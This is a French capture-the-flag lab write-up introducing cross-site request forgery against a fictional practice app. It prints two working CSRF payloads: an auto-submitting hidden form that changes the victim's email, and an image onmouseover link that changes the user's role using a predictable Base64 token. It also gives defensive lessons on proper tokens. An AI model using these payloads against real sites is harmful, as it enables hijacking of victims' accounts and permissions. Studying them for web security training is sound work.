---
title: "CSRF Introduction"
category: rooms
icon: "🦠"
difficulty: "Easy"
platform: "THM"
status: "Terminée"
tags: [web, csrf, cross-site-request-forgery, token, base64, session, auth-bypass]
summary: "Intro CSRF : conditions necessaires (session + action qui change un etat + pas de verif d'origine), PoC formulaire auto-soumis, et contournement d'un token CSRF faible (Base64 du role)."
updated: 2026-10-17
source: agent
---

> Room guidée : introduction à la CSRF (Cross-Site Request Forgery) sur l'appli fictive StaffHub. Deux PoC construits : formulaire auto-soumis (changement d'email) et contournement d'un token CSRF faible (changement de rôle).

## TL;DR
CSRF = faire exécuter à la victime, via son navigateur déjà authentifié, une action qu'elle n'a pas voulue — le serveur fait confiance au cookie de session sans vérifier l'origine de la requête.

## Les 3 conditions pour qu'une CSRF marche
1. Victime authentifiée (cookie de session valide).
2. L'action visée modifie un état (email, mot de passe, rôle, paramètres...).
3. Le serveur ne vérifie pas la provenance de la requête (pas de token, pas de check d'origine).

## PoC 1 — formulaire auto-soumis (changement d'email)
`update_email.php` accepte un POST `email=` sans aucun token. Payload `settings.html` :
```html
<form id="attack" action="http://staffhub.thm:8080/update_email.php" method="POST">
  <input type="hidden" name="email" value="attacker@evilmail.thm">
</form>
<script>
  document.getElementById("attack").submit();
  setTimeout(() => window.location = "settings.php", 1000);
</script>
```
Hébergé sur l'attackbox (`/var/www/html`, port 81) → lien envoyé à la victime → ouvert dans le MÊME navigateur/session qu'elle → email modifié.

## PoC 2 — token CSRF faible (changement de rôle)
Le formulaire de rôle est "protégé" par un `csrf_token`, mais c'est juste le **rôle actuel encodé en Base64** (`YWRtaW4=` = `admin`). Prévisible et recalculable sans jamais accéder au site.
```html
<img src="http://staffhub.thm:8080/one.png"
     onmouseover="window.location='http://staffhub.thm:8080/update_role.php?role=staff&csrf_token=YWRtaW4='"
     width="400">
```
L'image sert d'appât ; au survol, `onmouseover` déclenche une navigation GET qui change le rôle — le cookie de session suit automatiquement.

## Réflexes acquis
- **Réflexe** : GET n'est pas plus "sûr" que POST, et POST n'est pas une protection en soi. Toute action qui change un état (email, rôle, mdp, settings) est une cible CSRF potentielle, même déclenchable via un simple lien ou une `<img>`.
- **Réflexe** : un "token CSRF" n'est une vraie protection que s'il est **aléatoire, imprévisible et lié à la session**, vérifié côté serveur. Un encodage réversible (Base64, hash prévisible d'une valeur connue) n'est QUE de l'obfuscation — pire qu'absence de protection : ça donne un faux sentiment de sécurité.
- **Réflexe (test)** : pour vérifier une CSRF en pratique → héberger le payload HTML sur un port web de l'attackbox, l'ouvrir dans le MÊME navigateur/session que la victime (le cookie doit suivre). Toujours checker si le token change entre deux requêtes légitimes — s'il est statique ou déductible, il est cassé.
